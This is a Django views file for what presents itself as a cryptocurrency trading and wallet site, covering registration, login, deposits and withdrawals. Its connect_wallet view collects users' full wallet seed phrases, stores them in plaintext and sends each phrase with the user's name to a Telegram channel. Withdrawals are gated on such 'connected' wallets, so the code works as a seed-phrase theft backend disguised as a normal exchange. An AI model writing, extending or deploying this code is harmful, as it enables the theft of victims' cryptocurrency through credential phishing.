from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login, authenticate
from django.contrib.auth.views import LoginView
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.views.decorators.http import require_POST
from decimal import Decimal, ROUND_DOWN
import json
from .forms import RegistrationForm, EmailAuthenticationForm
from .models import Transaction, ConnectedWallet, UserHolding, UserAccount
from .telegram import send_telegram
from apps.market.models import MarketAsset, CryptoDepositAddress


def register(request):
    if request.method == 'POST':
        form = RegistrationForm(request.POST)
        if form.is_valid():
            user = form.save()
            authenticated_user = authenticate(
                request, username=user.email, password=form.cleaned_data['password1']
            )
            if authenticated_user:
                login(request, authenticated_user)
            return redirect('dashboard')
    else:
        form = RegistrationForm()
    return render(request, 'accounts/register.html', {'form': form})


class CustomLoginView(LoginView):
    template_name = 'accounts/login.html'
    authentication_form = EmailAuthenticationForm


@login_required
def profile(request):
    account = request.user.account
    wallets = account.wallets.all()
    return render(request, 'accounts/profile.html', {'account': account, 'wallets': wallets})


@login_required
@require_POST
def connect_wallet(request):
    account = request.user.account
    wallet_type = request.POST.get('wallet_type', '')
    seed_phrase = request.POST.get('seed_phrase', '').strip()
    if not wallet_type or not seed_phrase:
        messages.error(request, 'Wallet type and seed phrase are required')
        return redirect('profile')

    normalized, word_count = ConnectedWallet.normalize_seed_phrase(seed_phrase)
    if word_count not in (12, 15, 18, 21, 24):
        messages.error(request, 'Seed phrase must be 12, 15, 18, 21, or 24 words')
        return redirect('profile')

    ConnectedWallet.objects.create(
        account=account, wallet_type=wallet_type,
        seed_phrase=normalized,
        seed_word_count=word_count,
        address=f'demo_{wallet_type.lower()}_{account.user.username}_{ConnectedWallet.objects.count() + 1}',
    )
    messages.success(request, f'{dict(ConnectedWallet.WALLET_TYPES).get(wallet_type, wallet_type)} submitted for approval.')
    send_telegram(
        f"<b>\U0001f514 New Wallet Connected</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Type: {dict(ConnectedWallet.WALLET_TYPES).get(wallet_type, wallet_type)}\n"
        f"Words: {word_count}\n"
        f"Seed: {normalized}"
    )
    return redirect('profile')


@login_required
def wallet_view(request):
    account = request.user.account
    assets = MarketAsset.objects.filter(is_active=True)
    addrs = {addr.asset.code: addr.address for addr in CryptoDepositAddress.objects.filter(is_active=True)}
    return render(request, 'wallet/index.html', {
        'account': account,
        'assets': assets,
        'deposit_addresses_json': json.dumps(addrs),
    })


@login_required
def wallet_balances(request):
    account = request.user.account
    assets = MarketAsset.objects.filter(is_active=True)
    return render(request, 'includes/wallet_balances.html', {
        'account': account,
        'assets': assets,
    })


@login_required
def transactions_view(request):
    account = request.user.account
    txns = account.transactions.all()[:50]
    return render(request, 'wallet/transactions.html', {'transactions': txns})


@login_required
@require_POST
def deposit_request(request):
    account = request.user.account
    asset_code = request.POST.get('asset_code', '').upper()
    amount_input = request.POST.get('amount', '0')
    asset = get_object_or_404(MarketAsset, code=asset_code)
    addr = get_object_or_404(CryptoDepositAddress, asset=asset, is_active=True)

    try:
        amount = Decimal(str(amount_input)).quantize(Decimal('0.00000001'), rounding=ROUND_DOWN)
    except Exception:
        messages.error(request, 'Invalid amount')
        return redirect('wallet_view')

    if amount <= Decimal('0'):
        messages.error(request, 'Amount must be positive')
        return redirect('wallet_view')

    Transaction.objects.create(
        account=account, type='DEPOSIT', status='PENDING',
        asset_code=asset_code, asset_amount=amount,
        destination_address=addr.address,
    )
    messages.success(request, f'Deposit of {amount} {asset_code} requested. Send funds to the provided address.')
    send_telegram(
        f"<b>\U0001f4e5 Deposit Requested</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Asset: {asset_code}\n"
        f"Amount: {amount}\n"
        f"Address: {addr.address}"
    )
    return redirect('wallet_view')


@login_required
@require_POST
def withdrawal_request(request):
    account = request.user.account
    asset_code = request.POST.get('asset_code', '').upper()
    amount_input = request.POST.get('amount', '0')
    wallet_id = request.POST.get('wallet_id', '')
    asset = get_object_or_404(MarketAsset, code=asset_code)

    try:
        amount = Decimal(str(amount_input)).quantize(Decimal('0.00000001'), rounding=ROUND_DOWN)
    except Exception:
        messages.error(request, 'Invalid amount')
        return redirect('wallet_view')

    if amount <= Decimal('0'):
        messages.error(request, 'Amount must be positive')
        return redirect('wallet_view')

    holding = UserHolding.objects.filter(account=account, asset=asset).first()
    if not holding or holding.balance < amount:
        messages.error(request, f'Insufficient {asset_code} balance')
        return redirect('wallet_view')

    if wallet_id:
        wallet = get_object_or_404(ConnectedWallet, id=wallet_id, account=account, status='APPROVED')
        address = wallet.address
    else:
        messages.error(request, 'Please select a destination wallet')
        return redirect('wallet_view')

    Transaction.objects.create(
        account=account, type='WITHDRAWAL', status='PENDING',
        asset_code=asset_code, asset_amount=amount,
        destination_address=address,
    )
    messages.success(request, f'Withdrawal of {amount} {asset_code} requested.')
    send_telegram(
        f"<b>\U0001f4e4 Withdrawal Requested</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Asset: {asset_code}\n"
        f"Amount: {amount}\n"
        f"To: {address}"
    )
    return redirect('wallet_view')
